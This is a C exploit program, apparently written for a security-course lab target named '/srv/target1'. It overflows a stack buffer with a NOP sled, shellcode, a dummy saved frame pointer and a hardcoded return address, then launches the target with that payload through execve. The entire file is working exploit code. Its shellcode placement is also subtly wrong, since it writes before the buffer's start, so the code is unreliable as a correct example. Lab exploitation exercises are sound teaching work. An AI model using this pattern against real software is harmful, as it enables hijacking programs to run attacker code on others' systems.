#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"
#define BUFFER_SIZE 20
#define BUFFER_ADDRESS 0xffffd3f4

int main(void) {
    char *args[3];
    char *env[1];
    
    char buffer[BUFFER_SIZE];
    
    // Fill the first 12 bytes with NOP sled
    memset(buffer, 0x90, 12);
    
    // Copy the shellcode to the end of the buffer
    memcpy(buffer + 12 - sizeof(shellcode), shellcode, sizeof(shellcode));
    
    // Overwrite the saved base pointer with dummy values
    *(unsigned int*)(buffer + 12) = 0xdeadbeef;
    
    // Overwrite the return address with the address of the buffer (little-endian)
    *(unsigned int*)(buffer + 16) = BUFFER_ADDRESS;
    
    // Set up the arguments for the target program
    args[0] = TARGET;
    args[1] = buffer;
    args[2] = NULL;
    
    // Set up the environment
    env[0] = NULL;
    
    // Execute the target program with the exploit buffer
    execve(TARGET, args, env);
    
    fprintf(stderr, "execve failed.\n");
    return 0;
}